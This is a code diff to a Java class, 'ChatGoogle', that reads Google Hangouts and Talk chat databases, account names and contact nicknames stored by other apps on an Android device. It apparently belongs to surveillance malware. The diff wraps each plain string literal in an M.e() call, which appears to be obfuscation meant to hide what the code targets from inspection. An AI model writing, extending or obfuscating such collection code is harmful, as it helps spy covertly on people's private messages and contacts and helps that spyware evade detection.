@@ -80,12 +80,12 @@ public class ChatGoogle extends SubModuleChat {
 			String babel0 = M.e("babel0.db");
 			String babel1 = M.e("babel1.db");
 
-			String account = readAccount("1.name");
+			String account = readAccount(M.e("1.name"));
 			if (StringUtils.isEmpty(account) || !readHangoutMessages(lastLines, babel1, account)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages) try babel0");
 				}
-				account = readAccount("0.name");
+				account = readAccount(M.e("0.name"));
 				readHangoutMessages(lastLines, babel0, account);
 			}
 			readGoogleTalkMessages(lastLines);
@@ -283,7 +283,7 @@ public class ChatGoogle extends SubModuleChat {
 		final List<HangoutConversation> conversations = new ArrayList<HangoutConversation>();
 
 		String[] projection = new String[]{M.e("conversation_id"), M.e("latest_message_timestamp"), M.e("conversation_type"), M.e("generated_name")};
-		String selection = "latest_message_timestamp > " + timestamp;
+		String selection = M.e("latest_message_timestamp > ") + timestamp;
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
@@ -320,11 +320,11 @@ public class ChatGoogle extends SubModuleChat {
 		try {
 			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
 			Document doc = builder.parse(new File(xmlDir, xmlFile));
-			NodeList defaults = doc.getElementsByTagName("string");
+			NodeList defaults = doc.getElementsByTagName(M.e("string"));
 			for (int i = 0; i < defaults.getLength(); i++) {
 				Node d = defaults.item(i);
 				NamedNodeMap attributes = d.getAttributes();
-				Node attr = attributes.getNamedItem("name");
+				Node attr = attributes.getNamedItem(M.e("name"));
 				// nameField = "0.name"
 				if (nameField.equals(attr.getNodeValue())) {
 					Node child = d.getFirstChild();
@@ -443,7 +443,7 @@ public class ChatGoogle extends SubModuleChat {
 	}
 
 	private void setMyAccount(GenericSqliteHelper helper) {
-		String[] projection = new String[]{"_id", "name", "username"};
+		String[] projection =  StringUtils.split(M.e("_id,name,username"));
 		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
@@ -467,10 +467,10 @@ public class ChatGoogle extends SubModuleChat {
 	}
 
 	private void saveContacts(GenericSqliteHelper helper) {
-		String[] projection = new String[]{"username", "nickname"};
+		String[] projection = StringUtils.split(M.e("username,nickname"));
 
 		boolean tosave = false;
-		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {
+		RecordVisitor visitor = new RecordVisitor(projection, M.e("nickname not null ")) {
 
 			@Override
 			public long cursor(Cursor cursor) {
